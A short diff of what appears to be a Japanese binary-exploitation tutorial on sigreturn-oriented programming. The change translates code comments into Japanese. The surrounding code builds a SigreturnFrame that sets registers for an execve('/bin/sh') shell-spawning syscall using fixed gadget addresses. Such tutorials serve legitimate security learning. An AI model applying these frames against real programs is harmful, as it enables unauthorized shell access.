@@ -71,8 +71,8 @@ frame = SigreturnFrame()
 あとは、レジスタの値を決めるだけです。`execve()` syscall を起動したいので、そのために必要な値をレジスタに設定します。
 
 ```python
-frame.rax = 0x3b            # syscall number for execve
-frame.rdi = BINSH           # pointer to /bin/sh
+frame.rax = 0x3b            # execve のシステムコール番号
+frame.rdi = BINSH           # /bin/sh へのポインタ
 frame.rsi = 0x0             # NULL
 frame.rdx = 0x0             # NULL
 ```
@@ -107,8 +107,8 @@ POP_RAX = 0x41018
 SYSCALL_RET = 0x41015
 
 frame = SigreturnFrame()
-frame.rax = 0x3b            # syscall number for execve
-frame.rdi = BINSH           # pointer to /bin/sh
+frame.rax = 0x3b            # execve のシステムコール番号
+frame.rdi = BINSH           # /bin/sh へのポインタ
 frame.rsi = 0x0             # NULL
 frame.rdx = 0x0             # NULL
 frame.rip = SYSCALL_RET
